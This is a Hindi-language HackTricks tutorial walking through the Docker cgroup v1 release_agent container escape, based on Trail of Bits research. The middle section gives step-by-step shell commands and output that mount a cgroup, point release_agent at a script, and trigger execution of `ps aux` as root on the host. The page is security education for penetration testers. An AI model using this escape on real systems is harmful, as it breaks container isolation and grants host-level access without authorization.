# Docker release\_agent cgroups छूट

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>

### प्रमाण का विश्लेषण करना

इस उत्पादन को ट्रिगर करने के लिए हमें एक cgroup की आवश्यकता होती है जहां हम एक `release_agent` फ़ाइल बना सकते हैं और cgroup में सभी प्रक्रियाओं को मारकर `release_agent` आह्वान को ट्रिगर कर सकते हैं। इसे प्राप्त करने का सबसे आसान तरीका एक cgroup नियंत्रक माउंट करना है और एक बच्चा cgroup बनाना है।

इसके लिए, हम एक `/tmp/cgrp` निर्देशिका बनाते हैं, [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup नियंत्रक को माउंट करते हैं और एक बच्चा cgroup बनाते हैं (इस उदाहरण के उद्देश्य के लिए "x" नामित)। हालांकि, हर cgroup नियंत्रक का परीक्षण नहीं किया गया है, इस तकनीक का उपयोग अधिकांश cgroup नियंत्रकों के साथ काम करना चाहिए।

यदि आप इसका पालन कर रहे हैं और **`mount: /tmp/cgrp: special device cgroup does not exist`** प्राप्त करते हैं, तो यह इसलिए है कि आपके सेटअप में RDMA cgroup नियंत्रक नहीं है। **इसे ठीक करने के लिए `rdma` को `memory` में बदलें**। हम RDMA का उपयोग कर रहे हैं क्योंकि मूल PoC केवल इसके साथ काम करने के लिए डिज़ाइन किया गया था।

ध्यान दें कि cgroup नियंत्रक सार्वभौमिक संसाधन हैं जिन्हें विभिन्न अनुमतियों के साथ कई बार माउंट किया जा सकता है और एक माउंट में किए गए परिवर्तन दूसरे माउंट पर लागू होंगे।

हम नीचे "x" बच्चा cgroup निर्माण और इसकी निर्देशिका सूची देख सकते हैं।
```shell-session
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
अगले, हम **सीग्रुप** सूचनाएं सक्षम करते हैं "x" सीग्रुप के रिलीज़ होने पर इसके `notify_on_release` फ़ाइल में **1 लिखकर**। हम भी RDMA सीग्रुप रिलीज़ एजेंट को एक `/cmd` स्क्रिप्ट को निष्पादित करने के लिए सेट करते हैं - जिसे हम बाद में कंटेनर में बनाएंगे - होस्ट पर `release_agent` फ़ाइल में होस्ट पर `/cmd` स्क्रिप्ट पथ लिखकर। इसे करने के लिए, हम कंटेनर के पथ को होस्ट पर से `/etc/mtab` फ़ाइल से प्राप्त करेंगे।

हम कंटेनर में जो फ़ाइलें जोड़ते या संशोधित करते हैं, वे होस्ट पर मौजूद होती हैं, और इन्हें दोनों दुनियों से संशोधित किया जा सकता है: कंटेनर में पथ और होस्ट पर उनका पथ।

इन कार्रवाइयों को नीचे देखा जा सकता है:
```shell-session
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
उस पथ का ध्यान दें जहां हम होस्ट पर बनाने जा रहे हैं `/cmd` स्क्रिप्ट का।
```shell-session
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
अब, हम `/cmd` स्क्रिप्ट बनाते हैं जिसके द्वारा यह `ps aux` कमांड को निष्पादित करेगा और इसका आउटपुट `/output` में संग्रहीत करेगा, होस्ट पर आउटपुट फ़ाइल के पूर्ण पथ को निर्दिष्ट करके। अंत में, हम भी `/cmd` स्क्रिप्ट को प्रिंट करते हैं ताकि हम इसकी सामग्री देख सकें:
```shell-session
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
अंत में, हम एक प्रक्रिया उत्पन्न करके हमला को क्रियान्वित कर सकते हैं जो "x" बाल cgroup में तत्काल अंत हो जाती है। "/bin/sh" प्रक्रिया बनाकर और उसकी PID को "x" बाल cgroup निर्देशिका में `cgroup.procs` फ़ाइल में लिखकर, मेजबान पर स्क्रिप्ट `/bin/sh` के बाद निष्पादित होगी। मेजबान पर किए गए `ps aux` का आउटपुट फिर `/output` फ़ाइल में कंटेनर के अंदर सहेजा जाता है:
```shell-session
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
### संदर्भ

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**।

</details>
